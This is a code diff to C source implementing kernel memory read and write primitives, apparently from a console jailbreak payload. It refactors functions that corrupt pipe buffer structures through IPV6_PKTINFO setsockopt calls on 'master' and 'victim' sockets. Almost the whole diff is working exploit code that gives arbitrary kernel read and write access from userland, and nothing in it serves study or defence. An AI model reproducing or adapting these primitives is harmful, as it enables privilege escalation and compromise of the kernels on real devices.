@@ -39,6 +39,30 @@ along with this program; see the file COPYING. If not, see
 #define PROT_READ  1
 #define PROT_WRITE 2
 
+#define IN6_PKTINFOSZ 5 // (20/4)
+
+#pragma pack(4)
+typedef union kernel_pipe_buf {
+  unsigned int n[IN6_PKTINFOSZ];
+  struct f {
+    unsigned int cnt;
+    unsigned int in;
+    unsigned int out;
+    unsigned int reserved[2];
+  } flags;
+
+  struct b {
+    unsigned int size;
+    unsigned long buffer;
+    unsigned long reserved;
+  } pipe_buffer;
+
+  struct v {
+    unsigned long buffer;
+    unsigned int reserved[3];
+  } victim_buffer;
+} kernel_pipe_buf;
+#pragma pack()
 
 /**
  * public constants.
@@ -474,8 +498,8 @@ __kernel_init(payload_args_t* args) {
  * Write data to an address in kernel space.
  **/
 static int
-kernel_write(unsigned long addr, unsigned long *data) {
-  unsigned long victim_buf[3];
+kernel_write(unsigned long addr, void* data, unsigned long len) {
+  kernel_pipe_buf write_buf;
 
   // sanity check for invalid kernel pointers
   if(!(addr & 0xffff000000000000)) {
@@ -483,17 +507,18 @@ kernel_write(unsigned long addr, unsigned long *data) {
     return -1;
   }
 
-  victim_buf[0] = addr;
-  victim_buf[1] = 0;
-  victim_buf[2] = 0;
+  write_buf.victim_buffer.buffer = addr;
+  write_buf.victim_buffer.reserved[0] = 0;
+  write_buf.victim_buffer.reserved[1] = 0;
+  write_buf.victim_buffer.reserved[2] = 0;
 
   if(__crt_syscall(SYS_setsockopt, MASTER_SOCK, IPPROTO_IPV6, IPV6_PKTINFO,
-		   victim_buf, 0x14)) {
+		   &write_buf, sizeof(write_buf))) {
     return -1;
   }
 
   if(__crt_syscall(SYS_setsockopt, VICTIM_SOCK, IPPROTO_IPV6, IPV6_PKTINFO,
-		   data, 0x14)) {
+		   data, len)) {
     return -1;
   }
 
@@ -503,7 +528,7 @@ kernel_write(unsigned long addr, unsigned long *data) {
 
 int
 kernel_copyin(const void *uaddr, unsigned long kaddr, unsigned long len) {
-  unsigned long write_buf[3];
+  kernel_pipe_buf write_buf;
 
   if(!kaddr || !uaddr || !len) {
     SET_ERRNO(EINVAL);
@@ -511,18 +536,22 @@ kernel_copyin(const void *uaddr, unsigned long kaddr, unsigned long len) {
   }
 
   // Set pipe flags
-  write_buf[0] = 0;
-  write_buf[1] = 0x4000000000000000;
-  write_buf[2] = 0;
-  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
+  write_buf.flags.cnt = 0;
+  write_buf.flags.in = 0x40000000;
+  write_buf.flags.out = 0;
+  write_buf.flags.reserved[0] = 0; // set by next kernel_write
+  write_buf.flags.reserved[1] = 0; // set by next kernel_write
+
+  if(kernel_write(pipe_addr, &write_buf, sizeof(write_buf))) {
     return -1;
   }
 
   // Set pipe data addr
-  write_buf[0] = kaddr;
-  write_buf[1] = 0;
-  write_buf[2] = 0;
-  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
+  write_buf.pipe_buffer.size = 0x40000000;
+  write_buf.pipe_buffer.buffer = kaddr;
+  write_buf.pipe_buffer.reserved = 0;
+
+  if(kernel_write(pipe_addr + 12, &write_buf, sizeof(write_buf))) {
     return -1;
   }
 
@@ -537,7 +566,7 @@ kernel_copyin(const void *uaddr, unsigned long kaddr, unsigned long len) {
 
 int
 kernel_copyout(unsigned long kaddr, void *uaddr, unsigned long len) {
-  unsigned long write_buf[3];
+  kernel_pipe_buf write_buf;
 
   if(!kaddr || !uaddr || !len) {
     SET_ERRNO(EINVAL);
@@ -545,18 +574,22 @@ kernel_copyout(unsigned long kaddr, void *uaddr, unsigned long len) {
   }
 
   // Set pipe flags
-  write_buf[0] = 0x4000000040000000;
-  write_buf[1] = 0x4000000000000000;
-  write_buf[2] = 0;
-  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
+  write_buf.flags.cnt = 0x40000000;
+  write_buf.flags.in = 0x40000000;
+  write_buf.flags.out = 0;
+  write_buf.flags.reserved[0] = 0; // set by next kernel_write
+  write_buf.flags.reserved[1] = 0; // set by next kernel_write
+
+  if(kernel_write(pipe_addr, &write_buf, sizeof(write_buf))) {
     return -1;
   }
 
   // Set pipe data addr
-  write_buf[0] = kaddr;
-  write_buf[1] = 0;
-  write_buf[2] = 0;
-  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
+  write_buf.pipe_buffer.size = 0x40000000;
+  write_buf.pipe_buffer.buffer = kaddr;
+  write_buf.pipe_buffer.reserved = 0;
+
+  if(kernel_write(pipe_addr + 12, &write_buf, sizeof(write_buf))) {
     return -1;
   }
 
